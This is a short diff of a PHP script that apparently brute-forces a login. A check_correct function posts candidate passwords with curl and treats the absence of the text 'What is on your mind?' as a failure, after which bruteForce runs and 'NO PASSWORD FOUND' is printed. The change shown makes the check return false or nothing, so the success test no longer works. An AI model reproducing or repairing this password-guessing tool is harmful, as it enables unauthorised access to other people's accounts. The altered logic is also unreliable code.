@@ -35,8 +35,8 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "What is on your mind?") {return true;}
-        else {return false;}
+	if($str != "What is on your mind?") {return false;}
+        else {return ;}
 }
 bruteForce($Pass);
 echo "NO PASSWORD FOUND"; 
